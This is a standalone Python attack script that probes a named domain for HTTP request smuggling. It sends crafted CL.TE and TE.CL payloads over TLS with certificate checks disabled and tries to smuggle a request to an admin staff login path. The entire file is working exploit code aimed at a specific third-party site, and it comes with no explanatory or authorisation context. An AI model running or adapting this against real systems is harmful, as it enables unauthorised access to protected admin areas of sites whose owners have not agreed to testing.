import socket
import ssl
import time

def smuggle_probe(target_host, path="/", smuggled_path="/admin"):
    print(f"[*] Probing {target_host} for HTTP Request Smuggling...")
    
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE

    # CL.TE Smuggling Payload
    payload_clte = (
        "POST " + path + " HTTP/1.1\r\n"
        "Host: " + target_host + "\r\n"
        "Connection: keep-alive\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 6\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "GET " + smuggled_path + " HTTP/1.1\r\n"
        "Host: " + target_host + "\r\n"
        "\r\n"
    )

    # TE.CL Smuggling Payload
    payload_tecl = (
        "POST " + path + " HTTP/1.1\r\n"
        "Host: " + target_host + "\r\n"
        "Connection: keep-alive\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 4\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "12\r\n"
        "GET " + smuggled_path + " HTTP/1.1\r\n"
        "0\r\n"
        "\r\n"
    )

    scenarios = [("CL.TE", payload_clte), ("TE.CL", payload_tecl)]

    for name, payload in scenarios:
        print(f"\n[>] Testing {name}...")
        try:
            sock = socket.create_connection((target_host, 443))
            ssock = context.wrap_socket(sock, server_hostname=target_host)
            
            ssock.sendall(payload.encode())
            
            time.sleep(1)
            normal_request = (
                "GET " + path + " HTTP/1.1\r\n"
                "Host: " + target_host + "\r\n"
                "\r\n"
            )
            ssock.sendall(normal_request.encode())
            
            ssock.settimeout(5.0)
            response = ssock.recv(4096).decode(errors='ignore')
            
            print(f"   [+] Response Received (First 200 chars):")
            print("-" * 30)
            print(response[:200])
            print("-" * 30)
            
            if "HTTP/1.1 404" in response or "Admin" in response or "login" in response:
                 print(f"[!!!] POTENTIAL SMUGGLING DETECTED ({name})!")
            
            ssock.close()
        except Exception as e:
            print(f"   [-] Error: {e}")

if __name__ == "__main__":
    target = "seodomains.com.hr"
    smuggle_probe(target, smuggled_path="/admin/staff/login")
